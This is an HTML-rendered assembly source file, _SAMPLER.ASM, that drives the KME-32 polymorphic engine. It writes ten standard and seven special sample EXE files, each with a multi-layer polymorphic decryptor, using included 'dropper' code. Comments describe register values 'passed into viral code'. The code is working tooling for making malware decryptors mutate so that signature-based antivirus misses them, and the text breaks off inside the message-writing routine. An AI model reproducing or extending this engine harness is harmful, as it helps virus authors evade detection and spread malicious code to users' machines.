<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>_SAMPLER.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                          example of using KME-32</span><span class="sc0">
</span><span class="sc1">;                          ~~~~~~~~~~~~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; this program is used to test KME-32, it will generate some PE EXE files</span><span class="sc0">
</span><span class="sc1">; with polymorphic decryptor in the CODE section.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; nnnn.EXE              "standard" files</span><span class="sc0">
</span><span class="sc1">; Xnnn.EXE              "special" files, demonstating some abilities of KME</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc5">SRC</span><span class="sc0">\</span><span class="sc5">kme.inc</span><span class="sc0"> </span><span class="sc1">; KME interface stuff</span><span class="sc0">

</span><span class="sc5">NUM_OF_FILES</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">          </span><span class="sc1">; number of nnnn.EXEs to generate</span><span class="sc0">

</span><span class="sc1">;X1ONLY                 equ     YO</span><span class="sc0">

</span><span class="sc5">callW</span><span class="sc0">                   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">procname</span><span class="sc0">        </span><span class="sc1">; to call windows api</span><span class="sc0">
                        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">procname</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">procname</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">pusho</span><span class="sc0">                   </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">zzz</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">zzz</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">x</span><span class="sc0">
</span><span class="sc5">zzz</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc9">endm</span><span class="sc0">

                        </span><span class="sc5">p586</span><span class="sc0">
                        </span><span class="sc5">model</span><span class="sc0">   </span><span class="sc10">flat</span><span class="sc0">

                        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">rseed</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">v_nlayer</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ntry</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">msg_writing</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'writing '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; messages</span><span class="sc0">
</span><span class="sc5">msg_ok</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' - ok'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">msg_failed</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' *** FAILED *** (EAX=-'</span><span class="sc0">
</span><span class="sc5">msg_failed_ec</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'X'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">')'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">sampledir</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SAMPLES'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; output directory</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">'SAMPLES\'
</span><span class="sc5">filename_1stdigit</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'0000.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; current file</span><span class="sc0">
</span><span class="sc5">filename_ndigit</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc1">; reg values, passed into viral code. -1 = unused.</span><span class="sc0">
                        </span><span class="sc1">; also, register must match regavail bitset</span><span class="sc0">
</span><span class="sc5">exitregs</span><span class="sc0">                </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; eax</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">11111111h</span><span class="sc0">  </span><span class="sc1">; ecx</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">22222222h</span><span class="sc0">  </span><span class="sc1">; edx</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; ebx</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; esp (anyway unused)</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; ebp</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; esi</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; edi</span><span class="sc0">

</span><span class="sc5">initregs</span><span class="sc0">                </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; eax    initial EIP</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; ecx</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; edx    00530000 ?</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; ebx</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; esp (anyway unused)</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; ebp</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; esi</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; edi    seems, always 0</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">_exehdr.inc</span><span class="sc0">                      </span><span class="sc1">; dropper header</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">_dropper.inc</span><span class="sc0">                     </span><span class="sc1">; dropper code</span><span class="sc0">

                        </span><span class="sc1">; KME output:</span><span class="sc0">
</span><span class="sc5">buf_size</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; buffer size</span><span class="sc0">
</span><span class="sc5">buf_entry</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                       </span><span class="sc1">; buffer entry (rel)</span><span class="sc0">
</span><span class="sc5">buf</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">execode_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; buffer (poly decr)</span><span class="sc0">

</span><span class="sc5">tempbuf</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">execode_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; temporary buffer</span><span class="sc0">

                        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">intromsg</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_msg</span><span class="sc0">

                        </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetTickCount</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">rseed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; create output directory</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sampledir</span><span class="sc0">
                        </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CreateDirectoryA</span><span class="sc0">

                        </span><span class="sc1">; generate some "standard" files</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NUM_OF_FILES</span><span class="sc0">
</span><span class="sc5">main_cycle</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; main cycle</span><span class="sc0">

</span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">X1ONLY</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">v_nlayer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; 1..5 layers</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc0">        </span><span class="sc1">; flags</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD_ALL</span><span class="sc0">            </span><span class="sc1">; command mask</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD2_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">            </span><span class="sc1">; register mask</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">                 </span><span class="sc1">; jmp if rnd(X)==0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; filler</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_1_file</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">main_cycle</span><span class="sc0">

                        </span><span class="sc1">; generate some "special" files</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_1stdigit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'X'</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_ndigit</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc1">; X001.EXE -- disable JMPs</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">v_nlayer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; 4 layers</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">+</span><span class="sc5">FLAG_FAILIFNOMEMORY</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD2_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; unused 'coz FLAG_NOJMPS</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_1_file</span><span class="sc0">

</span><span class="sc9">IFNDEF</span><span class="sc0"> </span><span class="sc5">X1ONLY</span><span class="sc0">
                        </span><span class="sc1">; X002.EXE -- only regs ECX/EDX and commands SUB/DEC</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">v_nlayer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">+</span><span class="sc5">FLAG_NOSHORT</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD_SUB</span><span class="sc4">+</span><span class="sc5">CMD_DEC</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_ECX</span><span class="sc4">+</span><span class="sc5">REG_EDX</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_1_file</span><span class="sc0">

                        </span><span class="sc1">; X003.EXE -- only EAX and XOR, maximal compression</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">v_nlayer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">+</span><span class="sc5">FLAG_NOLOGIC</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD_XOR</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD2_CYCLE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_EAX</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_1_file</span><span class="sc0">

                        </span><span class="sc1">; X004.EXE -- JMP after each command</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">v_nlayer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLAG_EIP0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; jmp after each cmd</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_1_file</span><span class="sc0">

                        </span><span class="sc1">; X005.EXE -- only new stuff</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">v_nlayer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLAG_EIP0</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD_NEWSTUFF</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD2_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_1_file</span><span class="sc0">

                        </span><span class="sc1">; X006.EXE -- only ECX register</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">v_nlayer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">+</span><span class="sc5">FLAG_RANDOMSTRATEGY</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; unused</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD2_CYCLE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; unused</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; unused 'coz FLAG_NOJMPS</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">           </span><span class="sc1">; ofiller</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_1_file</span><span class="sc0">

                        </span><span class="sc1">; X007.EXE -- no repeteable PUSHs</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">v_nlayer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLAG_NOREPEATPUSH</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CMD2_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_1_file</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">; exit</span><span class="sc0">
                        </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc0">

                        </span><span class="sc1">; following procedure calls all the stuff we need</span><span class="sc0">
                        </span><span class="sc1">; to generate 1 file</span><span class="sc0">

</span><span class="sc5">gen_1_file</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inc_filename</span><span class="sc0">    </span><span class="sc1">; increase number of file</span><span class="sc0">

                        </span><span class="sc1">; copy filename into dropper</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_1stdigit</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dropper_insertname</span><span class="sc0">
                        </span><span class="sc6">movsd</span><span class="sc0">
                        </span><span class="sc6">movsd</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">msg_writing</span><span class="sc1">; message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_msg</span><span class="sc0">       </span><span class="sc1">; ...</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">   </span><span class="sc1">; ...</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_msg</span><span class="sc0">       </span><span class="sc1">; ...</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_kme</span><span class="sc0">        </span><span class="sc1">; generate decryptor</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KME_ERROR_SUCCESS</span><span class="sc0">  </span><span class="sc1">; KME engine result</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">gen_err</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">      </span><span class="sc1">; write file</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">msg_ok</span><span class="sc0">     </span><span class="sc1">; ok message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_msg</span><span class="sc0">       </span><span class="sc1">; ...</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">gen_err</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">msg_failed_ec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">msg_failed</span><span class="sc0"> </span><span class="sc1">; fault message</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_msg</span><span class="sc0">       </span><span class="sc1">; ...</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; subroutine to write message (in EDI)</span><span class="sc0">

</span><span class="sc5">write_msg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">11</span><span class="sc0">             </span><span class="sc1">; STD_OUTPUT_HANDLE</span><span class="sc0">
                        </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetStdHandle</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
